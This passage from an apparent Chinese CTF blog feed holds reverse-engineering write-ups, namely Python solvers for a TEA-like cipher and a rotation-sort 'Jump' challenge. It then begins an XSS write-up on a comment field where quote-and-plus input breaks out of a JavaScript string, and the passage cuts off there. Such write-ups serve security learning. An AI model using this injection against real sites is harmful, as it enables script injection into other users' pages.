class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ROL</span>(<span class="hljs-params">value,count</span>):<br>     <span class="hljs-keyword">return</span> ((value &lt;&lt; count) &amp; <span class="hljs-number">0xffffffff</span>) | (value &gt;&gt; (<span class="hljs-number">0x20</span> - count))<br><br><br>table = [<span class="hljs-number">67438087</span>, <span class="hljs-number">66051</span>, <span class="hljs-number">202182159</span>, <span class="hljs-number">134810123</span>, <span class="hljs-number">3443517467</span>, <span class="hljs-number">3619968119</span>, <span class="hljs-number">2671678006</span>, <span class="hljs-number">17297799</span>, <span class="hljs-number">4187212673</span>, <span class="hljs-number">3212056172</span>, <span class="hljs-number">3659105319</span>, <span class="hljs-number">436579327</span>, <span class="hljs-number">2466768356</span>, <span class="hljs-number">3414888005</span>, <span class="hljs-number">812513269</span>, <span class="hljs-number">2905604503</span>, <span class="hljs-number">2860953686</span>, <span class="hljs-number">1150444474</span>, <span class="hljs-number">1067728923</span>, <span class="hljs-number">507640087</span>, <span class="hljs-number">3335200381</span>, <span class="hljs-number">418057594</span>, <span class="hljs-number">3572254720</span>, <span class="hljs-number">3028744491</span>, <span class="hljs-number">2268592627</span>, <span class="hljs-number">1985887525</span>, <span class="hljs-number">3678221623</span>, <span class="hljs-number">3997455659</span>, <span class="hljs-number">298895692</span>, <span class="hljs-number">2606783435</span>, <span class="hljs-number">2419824819</span>, <span class="hljs-number">616754851</span>, <span class="hljs-number">2305691810</span>, <span class="hljs-number">575140032</span>, <span class="hljs-number">3092143274</span>, <span class="hljs-number">2368472304</span>, <span class="hljs-number">1002931244</span>, <span class="hljs-number">441505286</span>, <span class="hljs-number">1235325308</span>, <span class="hljs-number">2115810572</span>, <span class="hljs-number">4230461478</span>, <span class="hljs-number">1608376252</span>, <span class="hljs-number">3725575172</span>, <span class="hljs-number">2998077703</span>]<br><br>v1 = <span class="hljs-number">0x61616161</span><br>v2 = <span class="hljs-number">0x62626262</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>    v = v1<br>    v6 = ROL(v1,<span class="hljs-number">1</span>)<br>    v7 = ROL(v1,<span class="hljs-number">8</span>) &amp; v6<br><br>    v1 = v7 ^ ROL(v1,<span class="hljs-number">2</span>) ^ v2 ^ table[i]<br>    v2 = v<br><br>v1 = c_uint32(v1)<br>v2 = c_uint32(v2)<br>delta = <span class="hljs-number">0x10325476</span><br><span class="hljs-built_in">sum</span> = c_uint32(<span class="hljs-number">0</span>)<br>key = [<span class="hljs-number">0x3020100</span>,<span class="hljs-number">0x7060504</span>,<span class="hljs-number">0xb0a0908</span>,<span class="hljs-number">0xf0e0d0c</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>): <span class="hljs-comment"># æ€»å¾ªç¯æ¬¡æ•°ä¼šå˜ï¼Œæ˜¯2çš„næ¬¡å¹‚</span><br>    v2.value += (((v1.value &gt;&gt; <span class="hljs-number">5</span>) ^ (v1.value &lt;&lt; <span class="hljs-number">4</span>)) + v1.value) ^ (key[<span class="hljs-built_in">sum</span>.value &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>.value)<br>    <span class="hljs-built_in">sum</span>.value += delta<br>    v1.value += (((v2.value &gt;&gt; <span class="hljs-number">5</span>) ^ (v2.value &lt;&lt; <span class="hljs-number">4</span>)) + v2.value) ^ (key[(<span class="hljs-built_in">sum</span>.value &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>.value)<br>    <br></code></pre></td></tr></table></figure><p>æ®æ­¤å†™å‡ºé€†è¿ç®—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>enc=  [<span class="hljs-number">4260741734</span>, <span class="hljs-number">2050130566</span>, <span class="hljs-number">3465822212</span>, <span class="hljs-number">1574996700</span>, <span class="hljs-number">2800008458</span>, <span class="hljs-number">382381532</span>, <span class="hljs-number">332230412</span>, <span class="hljs-number">443930934</span>]<br>table = [<span class="hljs-number">67438087</span>, <span class="hljs-number">66051</span>, <span class="hljs-number">202182159</span>, <span class="hljs-number">134810123</span>, <span class="hljs-number">3443517467</span>, <span class="hljs-number">3619968119</span>, <span class="hljs-number">2671678006</span>, <span class="hljs-number">17297799</span>, <span class="hljs-number">4187212673</span>, <span class="hljs-number">3212056172</span>, <span class="hljs-number">3659105319</span>, <span class="hljs-number">436579327</span>, <span class="hljs-number">2466768356</span>, <span class="hljs-number">3414888005</span>, <span class="hljs-number">812513269</span>, <span class="hljs-number">2905604503</span>, <span class="hljs-number">2860953686</span>, <span class="hljs-number">1150444474</span>, <span class="hljs-number">1067728923</span>, <span class="hljs-number">507640087</span>, <span class="hljs-number">3335200381</span>, <span class="hljs-number">418057594</span>, <span class="hljs-number">3572254720</span>, <span class="hljs-number">3028744491</span>, <span class="hljs-number">2268592627</span>, <span class="hljs-number">1985887525</span>, <span class="hljs-number">3678221623</span>, <span class="hljs-number">3997455659</span>, <span class="hljs-number">298895692</span>, <span class="hljs-number">2606783435</span>, <span class="hljs-number">2419824819</span>, <span class="hljs-number">616754851</span>, <span class="hljs-number">2305691810</span>, <span class="hljs-number">575140032</span>, <span class="hljs-number">3092143274</span>, <span class="hljs-number">2368472304</span>, <span class="hljs-number">1002931244</span>, <span class="hljs-number">441505286</span>, <span class="hljs-number">1235325308</span>, <span class="hljs-number">2115810572</span>, <span class="hljs-number">4230461478</span>, <span class="hljs-number">1608376252</span>, <span class="hljs-number">3725575172</span>, <span class="hljs-number">2998077703</span>]<br>table = table[::-<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ROL</span>(<span class="hljs-params">value,count</span>):<br>     <span class="hljs-keyword">return</span> ((value &lt;&lt; count) &amp; <span class="hljs-number">0xffffffff</span>) | (value &gt;&gt; (<span class="hljs-number">0x20</span> - count))<br><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    v1 = c_uint32(enc[<span class="hljs-number">2</span>*k+<span class="hljs-number">1</span>])<br>    v2 = c_uint32(enc[<span class="hljs-number">2</span>*k])<br>    delta = <span class="hljs-number">0x10325476</span><br>    <span class="hljs-built_in">sum</span> = c_uint32(delta * (<span class="hljs-number">2</span>**(k+<span class="hljs-number">1</span>)))<br>    key = [<span class="hljs-number">0x3020100</span>,<span class="hljs-number">0x7060504</span>,<span class="hljs-number">0xb0a0908</span>,<span class="hljs-number">0xf0e0d0c</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**(k+<span class="hljs-number">1</span>)):<br>        v1.value -= (((v2.value &gt;&gt; <span class="hljs-number">5</span>) ^ (v2.value &lt;&lt; <span class="hljs-number">4</span>)) + v2.value) ^ (key[(<span class="hljs-built_in">sum</span>.value &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>.value)<br>        <span class="hljs-built_in">sum</span>.value -= delta<br>        v2.value -= (((v1.value &gt;&gt; <span class="hljs-number">5</span>) ^ (v1.value &lt;&lt; <span class="hljs-number">4</span>)) + v1.value) ^ (key[<span class="hljs-built_in">sum</span>.value &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>.value)<br><br>    v1 = v1.value <br>    v2 = v2.value<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>        v = v2<br>        v6 = ROL(v2,<span class="hljs-number">1</span>)<br>        v7 = ROL(v2,<span class="hljs-number">8</span>) &amp; v6<br><br>        v2 = v7 ^ ROL(v2,<span class="hljs-number">2</span>) ^ v1 ^ table[i]<br><br>        v1 = v<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(((v1 &lt;&lt; (i*<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt;<span class="hljs-number">24</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(((v2 &lt;&lt; (i*<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt;<span class="hljs-number">24</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br> <br><span class="hljs-comment"># mM7pJIobsCTQPO6R0g-L8kFExhYuivBN</span><br></code></pre></td></tr></table></figure><h2 id="Jump"><a href="#Jump" class="headerlink" title="Jump"></a>Jump</h2><p>è€ƒç‚¹å°±æ˜¯<code>setjmp()</code>å’Œ<code>longjmp()</code>çš„é…åˆï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å¯ä»¥åœ¨å‡½æ•°é—´å®ç°ç±»ä¼¼<code>goto</code>çš„è·³è·ƒã€‚</p><p>ç®€å•è¯´å°±æ˜¯<code>setjmp</code>ä¼šè®¾ç½®ä¸€ä¸ªç¼“å­˜ç‚¹ï¼Œéœ€è¦ä¸€ä¸ª<code>jmp_buf</code>å‚æ•°æ¥ä¿å­˜ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œå¹¶ä¸”è¿”å›0é›¶å€¼</p><p><code>longjmp</code>éœ€è¦ä¸€ä¸ª<code>jmp_buf</code>å‚æ•°æ¥çŸ¥æ™“è¦å»å“ªä¸ªç¼“å­˜ç‚¹ï¼Œè¿˜éœ€è¦ä¸€ä¸ª<code>val</code>å‚æ•°æ¥å‘Šè¯‰è¦è¿”å›ä»€ä¹ˆå€¼ã€‚è¿™é‡Œè¦æ³¨æ„çš„æ˜¯<code>longjmp</code>å‡½æ•°ä¸è¿”å›ï¼Œè€Œæ˜¯ç›´æ¥ä»<code>setjmp</code>è¿”å›ï¼Œè¿”å›å€¼å°±æ˜¯<code>val</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-13%2016.16.44.png"></p><p>æ•´ä½“çš„é€»è¾‘éƒ½æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œè¿˜ç”¨<code>setjmp</code>å’Œ<code>longjmp</code>åšäº†å¾ªç¯æ“ä½œã€‚</p><p>é€šè¿‡è°ƒè¯•å¯ä»¥çŸ¥é“è¾“å…¥0x22ä¸ªå­—ç¬¦ï¼Œç„¶åæ¯æ¬¡å¾ªç¯å·¦ç§»1ä½å¾—åˆ°äºŒç»´æ•°ç»„ç»™buffer2ï¼Œæ¯”å¦‚è¾“å…¥<code>985236147adgjlqwesxzcvbnmfuiopvx</code>,å°±ä¼šå¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;\x02985236147adgjlqwesxzcvbnmfuiopvx\x03&#x27;</span><br><span class="hljs-string">b&#x27;985236147adgjlqwesxzcvbnmfuiopvx\x03\x02&#x27;</span><br><span class="hljs-string">b&#x27;85236147adgjlqwesxzcvbnmfuiopvx\x03\x029&#x27;</span><br><span class="hljs-string">b&#x27;5236147adgjlqwesxzcvbnmfuiopvx\x03\x0298&#x27;</span><br><span class="hljs-string">b&#x27;236147adgjlqwesxzcvbnmfuiopvx\x03\x02985&#x27;</span><br><span class="hljs-string">b&#x27;36147adgjlqwesxzcvbnmfuiopvx\x03\x029852&#x27;</span><br><span class="hljs-string">b&#x27;6147adgjlqwesxzcvbnmfuiopvx\x03\x0298523&#x27;</span><br><span class="hljs-string">b&#x27;147adgjlqwesxzcvbnmfuiopvx\x03\x02985236&#x27;</span><br><span class="hljs-string">b&#x27;47adgjlqwesxzcvbnmfuiopvx\x03\x029852361&#x27;</span><br><span class="hljs-string">b&#x27;7adgjlqwesxzcvbnmfuiopvx\x03\x0298523614&#x27;</span><br><span class="hljs-string">b&#x27;adgjlqwesxzcvbnmfuiopvx\x03\x02985236147&#x27;</span><br><span class="hljs-string">b&#x27;dgjlqwesxzcvbnmfuiopvx\x03\x02985236147a&#x27;</span><br><span class="hljs-string">b&#x27;gjlqwesxzcvbnmfuiopvx\x03\x02985236147ad&#x27;</span><br><span class="hljs-string">b&#x27;jlqwesxzcvbnmfuiopvx\x03\x02985236147adg&#x27;</span><br><span class="hljs-string">b&#x27;lqwesxzcvbnmfuiopvx\x03\x02985236147adgj&#x27;</span><br><span class="hljs-string">b&#x27;qwesxzcvbnmfuiopvx\x03\x02985236147adgjl&#x27;</span><br><span class="hljs-string">b&#x27;wesxzcvbnmfuiopvx\x03\x02985236147adgjlq&#x27;</span><br><span class="hljs-string">b&#x27;esxzcvbnmfuiopvx\x03\x02985236147adgjlqw&#x27;</span><br><span class="hljs-string">b&#x27;sxzcvbnmfuiopvx\x03\x02985236147adgjlqwe&#x27;</span><br><span class="hljs-string">b&#x27;xzcvbnmfuiopvx\x03\x02985236147adgjlqwes&#x27;</span><br><span class="hljs-string">b&#x27;zcvbnmfuiopvx\x03\x02985236147adgjlqwesx&#x27;</span><br><span class="hljs-string">b&#x27;cvbnmfuiopvx\x03\x02985236147adgjlqwesxz&#x27;</span><br><span class="hljs-string">b&#x27;vbnmfuiopvx\x03\x02985236147adgjlqwesxzc&#x27;</span><br><span class="hljs-string">b&#x27;bnmfuiopvx\x03\x02985236147adgjlqwesxzcv&#x27;</span><br><span class="hljs-string">b&#x27;nmfuiopvx\x03\x02985236147adgjlqwesxzcvb&#x27;</span><br><span class="hljs-string">b&#x27;mfuiopvx\x03\x02985236147adgjlqwesxzcvbn&#x27;</span><br><span class="hljs-string">b&#x27;fuiopvx\x03\x02985236147adgjlqwesxzcvbnm&#x27;</span><br><span class="hljs-string">b&#x27;uiopvx\x03\x02985236147adgjlqwesxzcvbnmf&#x27;</span><br><span class="hljs-string">b&#x27;iopvx\x03\x02985236147adgjlqwesxzcvbnmfu&#x27;</span><br><span class="hljs-string">b&#x27;opvx\x03\x02985236147adgjlqwesxzcvbnmfui&#x27;</span><br><span class="hljs-string">b&#x27;pvx\x03\x02985236147adgjlqwesxzcvbnmfuio&#x27;</span><br><span class="hljs-string">b&#x27;vx\x03\x02985236147adgjlqwesxzcvbnmfuiop&#x27;</span><br><span class="hljs-string">b&#x27;x\x03\x02985236147adgjlqwesxzcvbnmfuiopv&#x27;</span><br><span class="hljs-string">b&#x27;\x03\x02985236147adgjlqwesxzcvbnmfuiopvx&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>\x02</code>å’Œ<code>\x03</code>æ˜¯ç¨‹åºåŠ çš„ã€‚</p><p>ç„¶åå‡½æ•°<code>sub_401F62</code>åˆ™æ ¹æ®è¿™ä¸ªäºŒç»´æ•°ç»„çš„ç¬¬ä¸€åˆ—è¿›è¡Œæ’åºï¼Œå¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;\x02985236147adgjlqwesxzcvbnmfuiopvx\x03&#x27;</span><br><span class="hljs-string">b&#x27;\x03\x02985236147adgjlqwesxzcvbnmfuiopvx&#x27;</span><br><span class="hljs-string">b&#x27;147adgjlqwesxzcvbnmfuiopvx\x03\x02985236&#x27;</span><br><span class="hljs-string">b&#x27;236147adgjlqwesxzcvbnmfuiopvx\x03\x02985&#x27;</span><br><span class="hljs-string">b&#x27;36147adgjlqwesxzcvbnmfuiopvx\x03\x029852&#x27;</span><br><span class="hljs-string">b&#x27;47adgjlqwesxzcvbnmfuiopvx\x03\x029852361&#x27;</span><br><span class="hljs-string">b&#x27;5236147adgjlqwesxzcvbnmfuiopvx\x03\x0298&#x27;</span><br><span class="hljs-string">b&#x27;6147adgjlqwesxzcvbnmfuiopvx\x03\x0298523&#x27;</span><br><span class="hljs-string">b&#x27;7adgjlqwesxzcvbnmfuiopvx\x03\x0298523614&#x27;</span><br><span class="hljs-string">b&#x27;85236147adgjlqwesxzcvbnmfuiopvx\x03\x029&#x27;</span><br><span class="hljs-string">b&#x27;985236147adgjlqwesxzcvbnmfuiopvx\x03\x02&#x27;</span><br><span class="hljs-string">b&#x27;adgjlqwesxzcvbnmfuiopvx\x03\x02985236147&#x27;</span><br><span class="hljs-string">b&#x27;bnmfuiopvx\x03\x02985236147adgjlqwesxzcv&#x27;</span><br><span class="hljs-string">b&#x27;cvbnmfuiopvx\x03\x02985236147adgjlqwesxz&#x27;</span><br><span class="hljs-string">b&#x27;dgjlqwesxzcvbnmfuiopvx\x03\x02985236147a&#x27;</span><br><span class="hljs-string">b&#x27;esxzcvbnmfuiopvx\x03\x02985236147adgjlqw&#x27;</span><br><span class="hljs-string">b&#x27;fuiopvx\x03\x02985236147adgjlqwesxzcvbnm&#x27;</span><br><span class="hljs-string">b&#x27;gjlqwesxzcvbnmfuiopvx\x03\x02985236147ad&#x27;</span><br><span class="hljs-string">b&#x27;iopvx\x03\x02985236147adgjlqwesxzcvbnmfu&#x27;</span><br><span class="hljs-string">b&#x27;jlqwesxzcvbnmfuiopvx\x03\x02985236147adg&#x27;</span><br><span class="hljs-string">b&#x27;lqwesxzcvbnmfuiopvx\x03\x02985236147adgj&#x27;</span><br><span class="hljs-string">b&#x27;mfuiopvx\x03\x02985236147adgjlqwesxzcvbn&#x27;</span><br><span class="hljs-string">b&#x27;nmfuiopvx\x03\x02985236147adgjlqwesxzcvb&#x27;</span><br><span class="hljs-string">b&#x27;opvx\x03\x02985236147adgjlqwesxzcvbnmfui&#x27;</span><br><span class="hljs-string">b&#x27;pvx\x03\x02985236147adgjlqwesxzcvbnmfuio&#x27;</span><br><span class="hljs-string">b&#x27;qwesxzcvbnmfuiopvx\x03\x02985236147adgjl&#x27;</span><br><span class="hljs-string">b&#x27;sxzcvbnmfuiopvx\x03\x02985236147adgjlqwe&#x27;</span><br><span class="hljs-string">b&#x27;uiopvx\x03\x02985236147adgjlqwesxzcvbnmf&#x27;</span><br><span class="hljs-string">b&#x27;vbnmfuiopvx\x03\x02985236147adgjlqwesxzc&#x27;</span><br><span class="hljs-string">b&#x27;vx\x03\x02985236147adgjlqwesxzcvbnmfuiop&#x27;</span><br><span class="hljs-string">b&#x27;wesxzcvbnmfuiopvx\x03\x02985236147adgjlq&#x27;</span><br><span class="hljs-string">b&#x27;x\x03\x02985236147adgjlqwesxzcvbnmfuiopv&#x27;</span><br><span class="hljs-string">b&#x27;xzcvbnmfuiopvx\x03\x02985236147adgjlqwes&#x27;</span><br><span class="hljs-string">b&#x27;zcvbnmfuiopvx\x03\x02985236147adgjlqwesx&#x27;</span><br></code></pre></td></tr></table></figure><p>å†ä»¥è¿™ä¸ªäºŒç»´æ•°ç»„çš„æœ€åä¸€åˆ—ä¸ºå¯†æ–‡ã€‚</p><p>é‚£ä¹ˆæ¢å¤ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå› ä¸ºæ¯ä¸€è¡Œé¦–å°¾ä¸¤ä¸ªä¸€å®šæ˜¯ç›¸è¿çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher = [ <span class="hljs-number">3</span>, <span class="hljs-number">106</span>, <span class="hljs-number">109</span>,  <span class="hljs-number">71</span>, <span class="hljs-number">110</span>,  <span class="hljs-number">95</span>,  <span class="hljs-number">61</span>, <span class="hljs-number">117</span>,  <span class="hljs-number">97</span>,  <span class="hljs-number">83</span>, <span class="hljs-number">90</span>,  <span class="hljs-number">76</span>, <span class="hljs-number">118</span>,  <span class="hljs-number">78</span>,  <span class="hljs-number">52</span>, <span class="hljs-number">119</span>,  <span class="hljs-number">70</span>, <span class="hljs-number">120</span>,  <span class="hljs-number">69</span>,  <span class="hljs-number">54</span>, <span class="hljs-number">82</span>,  <span class="hljs-number">43</span>, <span class="hljs-number">112</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">68</span>,  <span class="hljs-number">50</span>, <span class="hljs-number">113</span>,  <span class="hljs-number">86</span>,  <span class="hljs-number">49</span>,  <span class="hljs-number">67</span>, <span class="hljs-number">66</span>,  <span class="hljs-number">84</span>,  <span class="hljs-number">99</span>, <span class="hljs-number">107</span>]<br><br>sort_ed = [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">43</span>, <span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">52</span>, <span class="hljs-number">54</span>, <span class="hljs-number">61</span>, <span class="hljs-number">66</span>, <span class="hljs-number">67</span>, <span class="hljs-number">68</span>, <span class="hljs-number">69</span>, <span class="hljs-number">70</span>, <span class="hljs-number">71</span>, <span class="hljs-number">76</span>, <span class="hljs-number">78</span>, <span class="hljs-number">82</span>, <span class="hljs-number">83</span>, <span class="hljs-number">84</span>, <span class="hljs-number">86</span>, <span class="hljs-number">90</span>, <span class="hljs-number">95</span>, <span class="hljs-number">97</span>, <span class="hljs-number">99</span>, <span class="hljs-number">106</span>, <span class="hljs-number">107</span>, <span class="hljs-number">109</span>, <span class="hljs-number">110</span>, <span class="hljs-number">112</span>, <span class="hljs-number">113</span>, <span class="hljs-number">117</span>, <span class="hljs-number">118</span>, <span class="hljs-number">119</span>, <span class="hljs-number">120</span>]<br><span class="hljs-built_in">print</span>(t)<br><br>cur = q.index(<span class="hljs-number">2</span>)<br>ans = []<br><br><span class="hljs-keyword">while</span> q[cur]!=<span class="hljs-number">3</span>:<br>    nxt = sort_ed[cur]<br>    ans.append(nxt)<br>    cur = cipher.index(nxt)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ans))<br><br></code></pre></td></tr></table></figure><p><code>cipher</code>å°±æ˜¯æ’åºåçš„æœ€åä¸€åˆ—ï¼Œè€Œ<code>sort_ed</code>å°±æ˜¯å°†<code>cipher</code>å†è¿›è¡Œæ’åºï¼Œå› ä¸º<code>cipher</code>åŒ…å«äº†æ‰€æœ‰flagï¼Œé‚£ä¹ˆå°±å¾—åˆ°æ¯ä¸€è¡Œçš„ç¬¬ä¸€åˆ—ã€‚å†åªè¦ä¸€ä¸€å¯¹åº”å³å¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>recurrence</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackerGame-XSS &amp; TPCTF 2023 &amp; CVE-2023-4357</title>
    <link href="/2023/11/30/TPCTF_2023_CVE-2023-4357/"/>
    <url>/2023/11/30/TPCTF_2023_CVE-2023-4357/</url>
    
    <content type="html"><![CDATA[<h1 id="HackerGame-XSS-amp-CVE-2023-4357-amp-TPCTF-2023"><a href="#HackerGame-XSS-amp-CVE-2023-4357-amp-TPCTF-2023" class="headerlink" title="HackerGame-XSS &amp; CVE-2023-4357 &amp; TPCTF 2023"></a>HackerGame-XSS &amp; CVE-2023-4357 &amp; TPCTF 2023</h1><p>è®°å½•ä¸€äº›ä¸ªå¤ç°</p><span id="more"></span><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡TPCTFå‡ºäº†ä¸¤é“CVE-2023-4357çš„é¢˜ç›®ï¼Œè€Œä¸”è¿˜å€Ÿç”¨äº†<code>HackerGame2023</code>çš„ä¸­<code>å¾®ç§¯åˆ†ç»ƒä¹ é¢˜</code>çš„ä¸€ä¸ªbotè„šæœ¬ã€‚äºæ˜¯æ­£å¥½å€Ÿæ­¤æœºä¼šï¼Œå¤ç°ä¸€ä¸‹HGçš„è¿™é“é¢˜ç›®ï¼ŒåŒæ—¶ä¹Ÿå­¦ä¹ ä¸€ä¸‹è¿™ä¸ªCVEçš„åˆ©ç”¨å§¿åŠ¿</p><h2 id="å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ -2-0"><a href="#å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ -2-0" class="headerlink" title="å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹  2.0"></a>å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹  2.0</h2><h3 id="è¯„è®ºç•Œé¢åˆ†æ"><a href="#è¯„è®ºç•Œé¢åˆ†æ" class="headerlink" title="è¯„è®ºç•Œé¢åˆ†æ"></a>è¯„è®ºç•Œé¢åˆ†æ</h3><p>éšä¾¿è¾“å…¥é‚£å‡ é“å¾®ç§¯åˆ†çš„ç­”æ¡ˆåä¼šè¿›å…¥ä¸€ä¸ªè¯„è®ºç•Œé¢</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-29%2023.08.48.png"></p><p>åœ¨è¿™é‡Œè¾“å…¥çš„è¯„è®ºä¼šè¢«æ‹¼æ¥è¿›htmlé‡Œé¢ï¼Œf12æŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„è¯­å¥</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">updateElement(&quot;#comment&quot;, &quot;ä½ ç•™ä¸‹çš„è¯„è®ºï¼š123123&quot;);<br></code></pre></td></tr></table></figure><p>äºæ˜¯åœ¨è¿™é‡Œå°±æœ‰ä¸€ç§æ³¨å…¥æ–¹å¼ï¼Œå¦‚æœæˆ‘ä»¬çš„è¾“å…¥å¸¦æœ‰åŒå¼•å·<code>&quot;123123&quot;</code>ï¼Œå°±ä¼šå˜æˆè¿™æ ·å­</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">updateElement(&quot;#comment&quot;, &quot;ä½ ç•™ä¸‹çš„è¯„è®ºï¼š&quot;123123&quot;&quot;);<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯ä¼šæŠŠå‰é¡¹é—­åˆ</p><p>å¦‚æœè¯´å†å¸¦ä¸€ä¸ªåŠ å·<code>&quot;+123123+&quot;</code>ï¼Œå°±ä¼šå˜æˆè¿™æ ·</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">updateElement(&quot;#comment&quot;, &quot;ä½ 